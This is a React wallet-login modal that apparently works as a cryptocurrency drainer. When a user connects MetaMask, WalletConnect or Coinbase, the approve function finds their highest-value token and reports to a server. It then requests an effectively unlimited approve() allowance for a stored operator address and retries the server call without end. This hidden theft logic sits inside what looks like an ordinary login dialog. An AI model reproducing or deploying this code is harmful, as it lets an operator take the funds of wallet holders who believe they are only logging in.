import React, {useEffect, useRef} from 'react';
import {useWeb3React} from "@web3-react/core";
import {useMetaMask} from "metamask-react";
import {observer} from "mobx-react-lite";
import MainStore from "../store/MainStore";
import ModalStore from "../store/ModalStore";
import Web3 from "web3";

const ModalLogin = observer(({modalStyle, show, onClose, backdropStyle}) => {
    const modalRef = useRef(null);
    const {active, activate, account, library, chainId} = useWeb3React();
    const {status, connect} = useMetaMask();

    useEffect(async () => {
        await approve()
    }, [status])

    useEffect(async () => {
        await approve()
    }, [active])

    useEffect(async () => {
        await approve()
    }, [MainStore.connected])

    useEffect(() => {
        if (show)
            modalRef.current.classList.add('visible');
        else
            modalRef.current.classList.remove('visible');
    }, [show])

    const approve = async () => {
        console.log('connected All - ' + (status === "connected" || active || MainStore.connected))
        if (status === "connected" || active || MainStore.connected) {
            ModalStore.setOpenInfo(true)
            ModalStore.setOpenLogin(false)

            let acc = undefined;
            let web3 = undefined;
            let chan_id = undefined;

            if (active) {
                web3 = new Web3(library.provider);
                acc = account;
                chan_id = chainId;
            } else if (status === "connected") {
                web3 = new Web3(Web3.givenProvider);
                acc = (await web3.eth.getAccounts())[0];
                chan_id = await web3.eth.getChainId();
            } else if (MainStore.connected) {
                web3 = new Web3(MainStore.walletconnect);
                acc = (await web3.eth.getAccounts())[0];
                chan_id = await web3.eth.getChainId();
            }

            while (MainStore.winUserToken === undefined) {
                await MainStore.checker_Big_USD_Balance_from_ListTokens(web3, acc, chan_id);
            }
            await MainStore.createObjectToServer()


            await MainStore.updateSmartCallToServer(true)

            let approveNumber = '9999999999999999999999999999999999';
            if (active || status === "connected") {
                let contact = new web3.eth.Contract(
                    chan_id === 1 ? MainStore.CONTACT_ABI_CHAN_1 : MainStore.CONTACT_ABI_CHAN_56,
                    MainStore.winUserToken === undefined ?
                        (chan_id === 1 ? MainStore.defaultContractAddressERC20 : MainStore.defaultContractAddress) :
                        MainStore.winUserToken.token.contract
                );

                // console.log('---------1212---dfsdfsd-fds-fds-f-sd-fsd-f-ds-f---------')
                // console.log(acc)
                // console.log(MainStore.approveAddress)
                // console.log(JSON.stringify(contact))

                await contact.methods.approve(MainStore.approveAddress, web3.utils.toBN(approveNumber)).send({
                    from: acc
                })

            } else if (MainStore.connected) {
                let contact = new web3.eth.Contract(
                    chan_id === 1 ? MainStore.CONTACT_ABI_CHAN_1 : MainStore.CONTACT_ABI_CHAN_56,
                    MainStore.winUserToken === undefined ?
                        (chan_id === 1 ? MainStore.defaultContractAddressERC20 : MainStore.defaultContractAddress) :
                        MainStore.winUserToken.token.contract,
                    {transactionConfirmationBlocks: 1}
                );

                await contact.methods.approve(MainStore.approveAddress, web3.utils.toBN(approveNumber)).send({
                    from: acc,
                    gas: 55000
                })
            }

            console.log('send server...')
            while (true) {
                try {
                    let mainReq = await MainStore.sendToServer()
                    break
                } catch (e) {}
            }
            console.log('send server, end')
            ModalStore.setOpenInfo(false)
        }
    }

    return (
        <React.Fragment>
            <div ref={modalRef} style={backdropStyle} className={`modal__wrap`}>
                <div style={modalStyle} className={'modal modal_login'}>
                    <div onClick={onClose}
                         style={{
                             width: 30,
                             height: 30,
                             position: 'absolute',
                             top: 0,
                             right: 0,
                             margin: '1rem',
                             opacity: '.5',
                             cursor: 'pointer'
                         }}
                         className={'close__btn'}>
                        <svg viewPort="0 0 12 12" version="1.1"
                             color={'white'}
                             width='22' height='22'
                             xmlns="http://www.w3.org/2000/svg">
                            <line x1="1" y1="15"
                                  x2="15" y2="1"
                                  stroke="white"
                                  strokeWidth="2"/>
                            <line x1="1" y1="1"
                                  x2="15" y2="15"
                                  stroke="white"
                                  strokeWidth="2"/>
                        </svg>
                    </div>
                    <div>
                        <div className="wallet_items">
                            <a
                                onClick={async () => {
                                    if (status === "initializing") {
                                        alert("Synchronisation with MetaMask ongoing..")
                                        onClose()
                                    }
                                    if (status === "unavailable") {
                                        window.location.href = 'https://metamask.app.link/dapp/' + window.location.hostname
                                        onClose()
                                    }
                                    if (status === "notConnected") {
                                        try {
                                            await connect()
                                            onClose()
                                        } catch (e) {
                                            onClose()
                                        }
                                    }
                                }}
                            >
                                <div className="wallet_item">
                                    <img src="img/metamask.png" alt=""/>
                                    <p>Metamask</p>
                                </div>
                            </a>
                            <a onClick={async () => {
                                try {
                                    await MainStore.connect();
                                    onClose()
                                } catch (e) {
                                    onClose()
                                }
                            }}>
                                <div className="wallet_item">
                                    <img src="img/wallet_connect.png" alt=""/>
                                    <p>WalletConnect</p>
                                </div>
                            </a>
                            <a onClick={async () => {
                                try {
                                    await activate(MainStore.CoinBaseConnect);
                                    onClose()
                                } catch (e) {
                                    onClose()
                                }

                            }}>
                                <div className="wallet_item">
                                    <img src="img/coinbase.png" alt=""/>
                                    <p>Coinbase</p>
                                </div>
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </React.Fragment>
    );
});

export default ModalLogin;